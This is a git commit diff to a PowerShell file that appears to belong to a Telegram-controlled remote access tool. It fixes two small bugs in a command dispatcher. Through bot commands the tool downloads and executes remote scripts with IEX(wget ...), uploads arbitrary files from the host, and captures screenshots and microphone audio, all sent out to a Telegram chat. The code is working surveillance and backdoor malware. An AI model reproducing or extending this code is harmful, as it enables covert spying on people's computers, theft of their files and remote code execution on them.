b5acaf7bdd2cf86172e72697bbb8513c6d896a03
cybervaca <cybervaca@gmail.com>
2017-02-10 11:04:56 +0100

    Add files via upload

--- Functions.ps1
+++ Functions.ps1
@@ -134,10 +134,10 @@ function test-command {param ($comando,$texto,$botkey,$chat_id,$first_connect,$h
  if ($comando -like "/Ippublic") {$texto = public-ip -botkey $botkey | Format-List | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; $kill = $true}
  if ($comando -like "/Scriptimport") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(wget $comando);$texto = IEX $comando | Out-String ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat_id $chat_id }
  if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
  if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
- if ($comando -like "/Audio*") {$comando -replace "/Audio ",""; graba-audio -botkey $botkey -chat $chat_id -segundos $comando}
+ if ($comando -like "/Audio*") {$comando = $comando -replace "/Audio ",""; graba-audio -botkey $botkey -chat $chat_id -segundos $comando}
 
 
 }
